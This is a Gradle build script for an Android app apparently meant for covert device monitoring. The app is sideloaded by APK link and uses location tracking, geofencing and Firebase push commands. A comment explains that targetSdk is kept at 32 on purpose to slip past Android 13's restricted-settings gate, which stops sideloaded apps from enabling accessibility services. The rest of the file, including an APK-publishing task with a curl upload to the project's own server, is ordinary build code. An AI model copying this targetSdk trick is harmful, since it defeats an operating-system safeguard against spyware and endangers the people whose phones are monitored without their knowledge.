// Explicit imports: inside the Kotlin DSL `java` resolves to the Gradle Java
// extension, so fully-qualified JDK names do not compile here.
import java.security.MessageDigest
import java.time.OffsetDateTime

plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
    id("com.google.devtools.ksp")
    id("com.google.gms.google-services")
}

android {
    namespace = "com.spapp.monitoring"
    compileSdk = 34

    defaultConfig {
        applicationId = "com.spapp.monitoring"
        minSdk = 26
        // targetSdk 32 is deliberate, not an oversight.
        //
        // Android 13+ blocks the accessibility toggle for apps installed from
        // an "unknown source" (browser/sideload), forcing the user through
        // Settings > App info > 3-dot > "Allow restricted settings" before the
        // switch can be turned on. That gate is only applied to apps whose
        // targetSdk is 33+. Since this build ships as a direct APK link rather
        // than through Play, keeping targetSdk at 32 removes that extra step
        // and leaves accessibility as the single genuine user action.
        // compileSdk stays at 34 for the newer APIs used at compile time.
        targetSdk = 32
        versionCode = 61
        versionName = "1.6.2"

        // Backend base URL — self-hosted on CyberPanel (nikaipro.com), reachable
        // from any network (mobile data, any WiFi) since it's a real public
        // HTTPS host behind OpenLiteSpeed.
        buildConfigField("String", "API_BASE_URL", "\"https://api2.nikaipro.com/\"")
    }

    buildTypes {
        debug {
            isMinifyEnabled = false
        }
        release {
            isMinifyEnabled = true
            proguardFiles(getDefaultProguardFile("proguard-android-optimize.txt"), "proguard-rules.pro")
        }
    }

    buildFeatures {
        viewBinding = true
        buildConfig = true
    }

    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }

    kotlinOptions {
        jvmTarget = "17"
    }
}

dependencies {
    // Core / UI
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
    implementation("androidx.constraintlayout:constraintlayout:2.1.4")
    implementation("androidx.lifecycle:lifecycle-viewmodel-ktx:2.8.4")
    implementation("androidx.lifecycle:lifecycle-livedata-ktx:2.8.4")
    implementation("androidx.activity:activity-ktx:1.9.1")

    // Room (local buffer DB)
    implementation("androidx.room:room-runtime:2.6.1")
    implementation("androidx.room:room-ktx:2.6.1")
    ksp("androidx.room:room-compiler:2.6.1")

    // WorkManager (periodic background sync)
    implementation("androidx.work:work-runtime-ktx:2.9.1")

    // Networking
    implementation("com.squareup.retrofit2:retrofit:2.11.0")
    implementation("com.squareup.retrofit2:converter-gson:2.11.0")
    implementation("com.squareup.okhttp3:logging-interceptor:4.12.0")

    // Location & Geofencing
    implementation("com.google.android.gms:play-services-location:21.3.0")

    // Firebase Cloud Messaging (push commands)
    implementation(platform("com.google.firebase:firebase-bom:33.1.2"))
    implementation("com.google.firebase:firebase-messaging-ktx")

    // Coroutines
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.8.1")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-play-services:1.8.1")

    // Testing
    testImplementation("junit:junit:4.13.2")
    testImplementation("org.jetbrains.kotlinx:kotlinx-coroutines-test:1.8.1")
    androidTestImplementation("androidx.test.ext:junit:1.2.1")
    androidTestImplementation("androidx.test.espresso:espresso-core:3.6.1")
}

// Publish the newly compiled APK to the backend's storage directory.
//
// It used to be copied into dashboard/public/download and committed to git,
// which added an ~8 MB binary to the repository on every build. The backend
// now streams it from disk at GET /api/download/apk, and the storage folder is
// git-ignored, so a build only touches the local filesystem.
//
// The sidecar JSON lets the dashboard and the app report which build is live
// without parsing the APK.
tasks.register("publishApk") {
    description = "Copies the built APK to backend/storage/apk with version metadata"
    group = "distribution"

    doLast {
        val buildOutputDir = file("${layout.buildDirectory.get()}/outputs/apk")
        val debugApk = file("$buildOutputDir/debug/app-debug.apk")
        val releaseApk = file("$buildOutputDir/release/app-release.apk")
        val sourceApk = when {
            releaseApk.exists() -> releaseApk
            debugApk.exists() -> debugApk
            else -> null
        }

        if (sourceApk == null || !sourceApk.exists()) {
            println("⚠️ [publishApk] No APK found to publish")
            return@doLast
        }

        // AGP writes versionCode/versionName next to the APK; reading that
        // avoids depending on the android extension being resolvable here.
        val variant = if (sourceApk == releaseApk) "release" else "debug"
        val metadataFile = file("$buildOutputDir/$variant/output-metadata.json")
        var versionCode = ""
        var versionName = ""
        if (metadataFile.exists()) {
            val text = metadataFile.readText()
            versionCode = Regex("\"versionCode\"\\s*:\\s*(\\d+)").find(text)?.groupValues?.get(1) ?: ""
            versionName = Regex("\"versionName\"\\s*:\\s*\"([^\"]+)\"").find(text)?.groupValues?.get(1) ?: ""
        }

        // 1. Local backend storage (git-ignored) - what a dev machine serves.
        val storageDir = rootProject.file("../backend/storage/apk")
        storageDir.mkdirs()
        val target = file("$storageDir/spapp-monitor.apk")
        sourceApk.copyTo(target, overwrite = true)

        val digest = MessageDigest.getInstance("SHA-256")
        target.inputStream().use { input ->
            val buffer = ByteArray(1 shl 20)
            while (true) {
                val read = input.read(buffer)
                if (read <= 0) break
                digest.update(buffer, 0, read)
            }
        }
        val sha256 = digest.digest().joinToString("") { "%02x".format(it) }

        file("$storageDir/spapp-monitor.json").writeText(
            """
            {
              "filename": "${target.name}",
              "sizeBytes": ${target.length()},
              "sha256": "$sha256",
              "versionName": "$versionName",
              "versionCode": ${if (versionCode.isEmpty()) "null" else versionCode},
              "builtAt": "${OffsetDateTime.now()}",
              "variant": "$variant"
            }
            """.trimIndent()
        )

        println("✅ [publishApk] ${target.path} <- ${sourceApk.name} (${sourceApk.length()} bytes, v$versionName/$versionCode)")
        println("   Deploy with: curl -X POST 'https://api2.nikaipro.com/api/download/apk?versionName=$versionName&versionCode=$versionCode' ")
        println("                  -H 'Authorization: Bearer <super-admin JWT>' -H 'Content-Type: application/octet-stream' ")
        println("                  --data-binary '@${target.path}'")
    }
}

// Hook automatically into assemble, assembleDebug, and assembleRelease
tasks.matching { it.name in listOf("assembleDebug", "assembleRelease", "assemble") }.configureEach {
    finalizedBy("publishApk")
}

